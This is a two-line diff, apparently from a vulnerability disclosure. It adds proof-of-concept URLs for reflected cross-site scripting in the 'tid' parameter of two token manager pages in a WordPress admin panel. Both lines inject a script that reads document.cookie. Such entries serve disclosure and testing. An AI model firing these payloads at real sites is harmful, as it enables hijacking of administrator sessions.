@@ -1,0 +1,2 @@
+http://www.example.com/wp-admin/admin.php?page=tokenmanageredit&tid=<script>alert(document.cookie);</script>
+http://www.example.com/wp-admin/admin.php?page=tokenmanagertypeedit&tid=<script>alert(document.cookie);</script>
